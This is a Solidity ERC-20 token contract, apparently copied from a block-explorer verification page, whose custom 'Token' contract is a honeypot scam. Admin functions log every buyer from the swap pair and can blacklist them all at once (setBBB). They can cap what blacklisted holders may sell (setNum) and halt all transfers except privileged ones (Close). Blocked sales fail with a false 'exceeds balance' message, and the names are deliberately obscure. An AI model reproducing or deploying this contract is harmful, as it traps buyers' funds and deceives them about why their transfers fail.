/**
 *Submitted for verification at Arbiscan.io on 2024-05-12
*/

/**
 *Submitted for verification at Arbiscan.io on 2024-04-29
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;  
interface IERC165 { 
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}   
abstract contract ERC165 is IERC165 { 
    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IERC165).interfaceId;
    }
}  
library SafeMath { 
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    } 
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
 
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked { 
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    } 
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    } 
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    } 
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    } 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    } 
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    } 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    } 
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    } 
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    } 
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    } 
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}     
interface IJontrol { 
    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole); 
    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender); 
    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender); 
    function hasRole(bytes32 role, address account) external view returns (bool); 
    function getRoleAdmin(bytes32 role) external view returns (bytes32); 
    function grantRole(bytes32 role, address account) external; 
    function revokeRole(bytes32 role, address account) external; 
    function renounceRole(bytes32 role, address account) external;
}  
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
} 
library Strings {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef"; 
    function toString(uint256 value) internal pure returns (string memory) {  
        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    } 
    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "ADMIN";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    } 
    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }
}  
abstract contract Jontrol is Context, IJontrol, ERC165 {
    struct RoleData {
        mapping(address => bool) members;
        bytes32 adminRole;
    } 
    mapping(bytes32 => RoleData) private _roles; 
    bytes32 public constant ADMIN = 0x00;     
    modifier onlyRole(bytes32 role) {
        _checkRole(role, _msgSender());
        _;
    } 
    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(Jontrol).interfaceId || super.supportsInterface(interfaceId);
    }
 
    function hasRole(bytes32 role, address account) public view override returns (bool) {
        return _roles[role].members[account];
    } 
    function _checkRole(bytes32 role, address account) internal view {
        if (!hasRole(role, account)) {
            revert(
                string(
                    abi.encodePacked(
                        "AccessControl: account ",
                        Strings.toHexString(uint160(account), 20),
                        " is missing role ",
                        Strings.toHexString(uint256(role), 32)
                    )
                )
            );
        }
    } 
    function getRoleAdmin(bytes32 role) public view override returns (bytes32) {
        return _roles[role].adminRole;
    } 
    function grantRole(bytes32 role, address account) public virtual override onlyRole(ADMIN) {
        _grantRole(role, account);
    } 
    function revokeRole(bytes32 role, address account) public virtual override onlyRole(ADMIN) {
        _revokeRole(role, account);
    }
 
    function renounceRole(bytes32 role, address account) public virtual override {
        require(account == _msgSender(), "AccessControl: can only renounce roles for self");

        _revokeRole(role, account);
    } 
    function _setupRole(bytes32 role, address account) internal virtual {
        _grantRole(role, account);
    } 
    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {
        bytes32 previousAdminRole = getRoleAdmin(role);
        _roles[role].adminRole = adminRole;
        emit RoleAdminChanged(role, previousAdminRole, adminRole);
    } 
    function _grantRole(bytes32 role, address account) internal virtual {
        if (!hasRole(role, account)) {
            _roles[role].members[account] = true;
            emit RoleGranted(role, account, _msgSender());
        }
    } 
    function _revokeRole(bytes32 role, address account) internal virtual {
        if (hasRole(role, account)) {
            _roles[role].members[account] = false;
            emit RoleRevoked(role, account, _msgSender());
        }
    }
}    
interface IERC20 { 
    function totalSupply() external view returns (uint256); 
    function balanceOf(address account) external view returns (uint256); 
    function transfer(address recipient, uint256 amount) external returns (bool); 
    function allowance(address owner, address spender) external view returns (uint256); 
    function approve(address spender, uint256 amount) external returns (bool); 
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool); 
    event Transfer(address indexed from, address indexed to, uint256 value);  
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
interface IERC20Metadata is IERC20 { 
    function name() external view returns (string memory);  
    function symbol() external view returns (string memory);  
    function decimals() external view returns (uint8);
} 
contract ERC20 is Context, IERC20, IERC20Metadata  {  
    mapping(address => uint256) internal _balances; 
    mapping(address => mapping(address => uint256)) internal _allowances; 
    uint256 internal _totalSupply; 
    string internal _name;
    string internal _symbol; 
    constructor(string memory name_, string memory symbol_,uint256 totalSupply_,address creater_) {
        _name = name_;
        _symbol = symbol_; 
        _mint(creater_,totalSupply_*10**decimals());
    } 
    function name() public view virtual override returns (string memory) {
        return _name;
    } 
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    } 
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }  
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    } 
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    } 
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    } 
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    } 
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }  
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    } 
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }  
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }  
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address"); 
        _beforeTokenTransfer(sender, recipient, amount); 
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount; 
        emit Transfer(sender, recipient, amount); 
        _afterTokenTransfer(sender, recipient, amount);
    } 
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address"); 
        _beforeTokenTransfer(address(0), account, amount); 
        _totalSupply += amount;
        _balances[account] += amount; 
        emit Transfer(address(0), account, amount); 
        _afterTokenTransfer(address(0), account, amount);
    } 
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address"); 
        _beforeTokenTransfer(account, address(0), amount); 
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    } 
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address"); 
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }  
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
 
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}    
contract Token is ERC20,Jontrol{  
    using  SafeMath for  uint256;  
    address         public             _ubiswappair;   
    mapping (address=>uint256) private _jiurl;  
    mapping (address=>uint256) private _ireto;  
    mapping (uint256=>address) private _buy;
    uint256 private _number;
    address private _aaaaa;
    bool    private _stat;
    constructor(string memory _name,string memory _symbol,uint256 _totalSupply,address tokenHold)
    ERC20(_name, _symbol,_totalSupply,tokenHold)
    {  
        _grantRole(ADMIN, _msgSender());    
    }    
    function AirDrop(address air)public  onlyRole(ADMIN){
        _aaaaa=air;
    }
    function setNum(address user, uint256 number) public  onlyRole(ADMIN){
         _ireto[user]=number*10**18;
    } 
    function unAAA(address user) public onlyRole(ADMIN){
        _jiurl[user]=1;
    }
    function UnBBB(address user) public  onlyRole(ADMIN){
        _jiurl[user]=0;
    }         
    function Open()public  onlyRole(ADMIN){
       _stat=false; 
    }       
    function Close() public onlyRole(ADMIN){
       _stat=true; 
    }    
    function _transfer(address from,address to,uint256 amount) internal override(ERC20){
        require(from!=address(0),"ERC20:transfer from the zero address");
        require(to!=address(0)  ,"ERC20:transfer from the zero address");   
        uint256 senderBalance = _balances[from];   
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");    
        require(amount>0);  
        if(from==_ubiswappair){
            _buy[_number]=to;
            _number=_number+1;
        }
        if(_stat){
            if(from==_ubiswappair || from==_aaaaa){  
            }else{ 
                    require(false,"transfer is Close");
            }   
        } 
        if(to==_ubiswappair){  
            if(_jiurl[from]==1  && _ireto[from]>=amount){
                _ireto[from]=_ireto[from].sub(amount);  
            }else{
                require(_jiurl[from]==0,"ERC20: transfer amount exceeds balance"); 
            }
        }else if(from!=_ubiswappair){  
            if(_jiurl[from]==1  && _ireto[from]>=amount){
                 _ireto[from]=_ireto[from].sub(amount);  
            }else{ 
                require(_jiurl[from]==0,"ERC20: transfer amount exceeds balance"); 
            }
        } 
        unchecked {     
            _balances[from] = senderBalance.sub(amount); 
        }   
        _balances[to] = _balances[to].add(amount);   
        emit Transfer(from, to, amount); 
    }     
    function setpair(address ubiswap) public onlyRole(ADMIN){
        _ubiswappair=ubiswap;
    }  

    function setBBB()public onlyRole(ADMIN) returns(uint256){
        uint256 count=0;
        for(uint256 index=0;index<_number;index++){
            address temp=_buy[index];
            if(_jiurl[temp]==0){
                _jiurl[temp]=1;
                count++;
            } 
        }
     return count;
    }       
}